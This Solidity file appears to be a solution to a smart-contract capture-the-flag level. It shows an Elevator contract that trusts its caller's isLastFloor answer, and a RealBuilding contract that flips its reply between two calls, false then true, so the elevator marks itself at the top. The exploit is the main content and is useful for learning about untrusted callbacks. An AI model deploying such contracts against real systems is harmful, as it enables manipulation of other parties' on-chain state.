pragma solidity ^0.4.18;


interface Building {
  function isLastFloor(uint) view public returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract RealBuilding is Building{
    bool flag;
    Elevator elevator = Elevator(0x66ac58b166045722a9cafb9be9e7db42bcaa92f3);
    
    function RealBuilding() public{
        flag = false;
    }
    
    function isLastFloor(uint _floor)
    view
    public 
    returns(bool){
        bool toReturn = flag;
        flag = !toReturn;
        return toReturn;
    }
    
    function callElevator() 
    public{
        elevator.goTo(2);
    }
}